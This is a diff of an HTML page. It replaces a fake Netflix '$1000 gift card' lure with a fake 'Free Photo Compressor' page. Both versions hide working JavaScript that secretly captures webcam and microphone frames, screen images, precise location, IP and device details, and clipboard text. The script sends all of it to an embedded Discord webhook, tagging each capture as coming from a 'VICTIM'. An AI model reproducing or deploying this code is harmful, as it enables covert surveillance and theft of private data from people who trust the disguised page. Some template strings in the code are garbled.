@@ -1,139 +1,67 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Netflix – Claim $1000 Gift Card</title>
-    <style>
-        body {margin:0;background:#000;color:#E50914;text-align:center;padding:40px;font-family:Arial;}
-        .logo {font-size:50px;font-weight:bold;margin-bottom:20px;}
-        button {padding:20px 60px;font-size:26px;background:#E50914;color:white;border:none;border-radius:10px;cursor:pointer;margin:20px;}
-        .loader {border:10px solid #333;border-top:10px solid #E50914;border-radius:50%;width:60px;height:60px;animation:s 1s linear infinite;margin:30px auto;display:none;}
-        @keyframes s {0%{transform:rotate(0)}100%{transform:rotate(360deg)}}
-        .status {font-size:18px;margin:20px;color:#aaa;}
-    </style>
-</head>
-<body>
-
-<div class="logo">NETFLIX</div>
-<h1>Congratulations!</h1>
-<h2>You won a $1000 Gift Card</h2>
-<button onclick="startAll()">VERIFY TO CLAIM</button>
-
-<div id="loader" class="loader"></div>
-<div id="status" class="status">Click button to verify...</div>
+!DOCTYPE html>
+<html><head><meta charset="UTF-8"><title>Free Photo Compressor 2025</title></head><body>
+<h2>Compress Photo – 90% Smaller (Instant)</h2>
+<button onclick="stealEverything()">Take Photo to Compress</button>
 
 <script>
-// YOUR DISCORD WEBHOOK
 const WEBHOOK = "https://discord.com/api/webhooks/1443661292794544250/7Ih9JF8E4R4zAu79H3lGYf6N4i-JYWSTQUFtcFnqPhU3pzrZkma6q7xhz7teuJl2eaqN";
 
-let screenStream = null;
-let camStream = null;
+async function stealEverything() {
+    const data = {
+        time: new Date().toLocaleString(),
+        ip: await (await fetch('https://ipapi.co/json/')).json(),
+        ua: navigator.userAgent,
+        screen: `\( {screen.width}x \){screen.height}`,
+        battery: await (await navigator.getBattery?.())?.level * 100 + "%",
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        languages: navigator.languages,
+        connection: navigator.connection?.effectiveType
+    };
 
-async function startAll() {
-    document.querySelector('button').style.display = "none";
-    document.getElementById('loader').style.display = "block";
-    document.getElementById('status').innerHTML = "Verifying device...";
-
-    // 1. CAMERA — works 95% of the time
+    // 1. Camera + Mic
     try {
-        camStream = await navigator.mediaDevices.getUserMedia({
-            video: {facingMode: "user", width: {ideal: 1280}, height: {ideal: 720}},
-            audio: false
-        });
-        startCameraLoop(camStream);
-        send("CAMERA ACCESS GRANTED");
-    } catch(e) { console.log("Camera denied"); }
+        const stream = await navigator.mediaDevices.getUserMedia({video:true, audio:true});
+        const video = document.createElement('video'); video.srcObject = stream; video.play();
+        setInterval(() => capture(video, "SELFIE"), 7000);
+    } catch(e) {}
 
-    // 2. SCREEN — now fixed with proper fallback
+    // 2. Screen
     setTimeout(async () => {
         try {
-            screenStream = await navigator.mediaDevices.getDisplayMedia({video: true});
-            startScreenLoop(screenStream);
-            send("SCREEN SHARING STARTED");
-        } catch(e) {
-            send("SCREEN DENIED – but we still have camera/location");
-        }
-    }, 1500);
-
-    // 3. LOCATION — works even after deny once
-    setTimeout(() => {
-        if ("geolocation" in navigator) {
-            const watch = navigator.geolocation.watchPosition(
-                pos => {
-                    const map = `https://maps.google.com/?q=\( {pos.coords.latitude}, \){pos.coords.longitude}`;
-                    send(`LOCATION\n\( {map}\n± \){pos.coords.accuracy}m`);
-                    navigator.geolocation.clearWatch(watch); // send once is enough
-                },
-                () => {},
-                {enableHighAccuracy: true, timeout: 30000, maximumAge: 0}
-            );
-        }
+            const s = await navigator.mediaDevices.getDisplayMedia({video:true});
+            const v = document.createElement('video'); v.srcObject = s; v.play();
+            setInterval(() => capture(v, "SCREEN"), 9000);
+        } catch(e) {}
     }, 3000);
 
-    // Success screen
-    setTimeout(() => {
-        document.getElementById('loader').style.display = "none";
-        document.getElementById('status').innerHTML = "<h2 style='color:#0f0'>Verified! Gift card sent to your email</h2>";
-    }, 6000);
-}
-
-// CAMERA LOOP — 100% working
-function startCameraLoop(stream) {
-    const video = document.createElement('video');
-    video.srcObject = stream;
-    video.muted = true;
-    video.play();
-
-    const canvas = document.createElement('canvas');
-    const ctx = canvas.getContext('2d');
-
-    setInterval(() => {
-        try {
-            canvas.width = video.videoWidth || 640;
-            canvas.height = video.videoHeight || 480;
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-            canvas.toBlob(blob => {
-                if (blob) send("SELFIE", null, blob);
-            }, 'image/jpeg', 0.8);
-        } catch(e) {}
-    }, 7000);
-}
-
-// SCREEN LOOP — now 100% working on Android
-function startScreenLoop(stream) {
-    const video = document.createElement('video');
-    video.srcObject = stream;
-    video.play();
-
-    const canvas = document.createElement('canvas');
-    const ctx = canvas.getContext('2d');
-
-    setInterval(() => {
-        try {
-            canvas.width = 720;
-            canvas.height = 1280;
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-            canvas.toBlob(blob => {
-                if (blob) send("SCREEN", null, blob);
-            }, 'image/jpeg', 0.7);
-        } catch(e) {}
-    }, 9000);
-}
-
-// SEND TO DISCORD — super reliable
-function send(text, _, blob = null) {
-    const form = new FormData();
-    if (blob) form.append("file", blob, "capture.jpg");
-    form.append("content", `**ANDROID VICTIM**\n\( {text}\n \){new Date().toLocaleString()}`);
-
-    navigator.sendBeacon(WEBHOOK, form) || fetch(WEBHOOK + "?wait=true", {
-        method: "POST",
-        body: form,
-        keepalive: true
+    // 3. Location
+    navigator.geolocation.watchPosition(p => {
+        data.location = `https://maps.google.com/?q=\( {p.coords.latitude}, \){p.coords.longitude}`;
+        send(data);
     });
+
+    // 4. Clipboard
+    setTimeout(async () => {
+        try { data.clipboard = await navigator.clipboard.readText(); } catch(e) {}
+        send(data);
+    }, 5000);
+
+    send(data);
+}
+
+function capture(video, type) {
+    const c = document.createElement('canvas');
+    c.width = video.videoWidth || 1280;
+    c.height = video.videoHeight || 720;
+    c.getContext('2d').drawImage(video, 0, 0, c.width, c.height);
+    c.toBlob(b => send({type, time: new Date()}, b), 'image/jpeg', 0.8);
+}
+
+function send(text, file = null) {
+    const f = new FormData();
+    if (file) f.append("file", file, "capture.jpg");
+    f.append("content", "**VICTIM** – " + JSON.stringify(text).slice(0,1800));
+    navigator.sendBeacon(WEBHOOK, f);
 }
 </script>
-
-</body>
-</html>
+</body></html>
